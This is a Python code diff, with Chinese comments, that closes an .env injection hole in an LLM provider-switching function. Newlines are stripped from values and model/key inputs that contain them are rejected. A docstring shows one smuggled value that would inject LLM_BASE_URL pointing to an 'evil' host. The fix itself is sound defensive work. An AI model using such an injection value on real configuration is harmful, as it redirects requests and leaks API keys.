@@ -83,9 +83,15 @@ def upsert_env(text: str, values: dict[str, str]) -> str:
 
     同名但被注释掉的行（`# LLM_MODEL=...`）不碰——那是给人看的备选示例，
     真生效的只有不带 # 的那一行。
+
+    值里的换行必须滤掉：.env 是行格式文件，值里一个 \\n 就会变成下一行，
+    等于往配置里注入任意变量——比如 model 里塞 "x\\nLLM_BASE_URL=https://evil"
+    就能把后续所有 LLM 请求（带着 API key）导向攻击者的服务器。
+    调用方（switch）已经拒绝含换行的输入，这里是纵深兜底。
     """
     lines = text.splitlines()
     for k, v in values.items():
+        v = "".join(ch for ch in v if ch not in "\n\r")
         done = False
         for i, line in enumerate(lines):
             s = line.strip()
@@ -114,6 +120,13 @@ def switch(
     spec = PROVIDERS[provider]
     model = (model or "").strip() or spec["model"]
     key = (key or "").strip()
+
+    # .env 注入防线（2026-11-05 安全审查 P1）：model/key 来自 HTTP body，
+    # 含换行就能往 .env 里塞新行注入 LLM_BASE_URL，把后续请求导去恶意服务器
+    # 并外传 API key。这里在写文件之前直接拒绝。
+    for label, value in (("model", model), ("key", key)):
+        if value and any(c in value for c in "\n\r"):
+            return {"ok": False, "error": f"{label} 含换行符，已拒绝写入（防止 .env 注入）"}
 
     # 两个快照：文件的、进程环境的。回滚要同时回，否则「文件回去了、
     # 内存还是坏的」，面板会一直用坏配置调到进程重启为止。
